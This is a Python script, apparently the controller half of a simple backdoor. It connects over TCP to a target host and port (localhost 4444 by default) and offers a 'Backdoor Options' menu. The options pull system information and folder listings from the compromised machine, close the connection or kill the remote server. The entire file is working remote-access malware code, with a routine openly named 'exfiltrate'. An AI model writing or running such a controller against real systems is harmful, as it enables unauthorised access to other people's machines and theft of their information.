import socket


def main():
    # target_ip = input("Target IP: ")
    # target_port = int(input("Target Port: "))
    target_ip = "127.0.0.1"
    target_port = 4444
    target = {"ip": target_ip, "port": target_port}
    print("[-] Establishing connection to {0}:{1}...".format(target["ip"], target["port"]))
    sock_conn = socket_connection(target)
    print("[-] Connected to {0}:{1}".format(target["ip"], target["port"]))
    exfiltrate(sock_conn)


def exfiltrate(s):
    while 1:
        print("Backdoor Options:\n\t1: Get System Info\n\t2: Get Folder Contents\n\t0: Close Connection\n\t9: Kill Server")
        selection = input(">")
        if selection == "0":
            s.sendall(selection.encode())
            s.close()
            break
        elif selection == "1":
            s.sendall(selection.encode())
            system_info = s.recv(1024)
            print(system_info.decode('utf-8'))
        elif selection == "2":
            s.sendall(selection.encode())
            path = input("Folder path: ")
            s.sendall(path.encode())
            file_list = s.recv(1024)
            print(file_list)
            file_list = file_list.decode().split(',')
            for file in file_list:
                print(file)
        elif selection == "9":
            s.sendall(selection.encode())
            break


def socket_connection(target):
    sock_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_conn.connect((target["ip"], target["port"]))
    return sock_conn


if __name__ == "__main__":
    main()
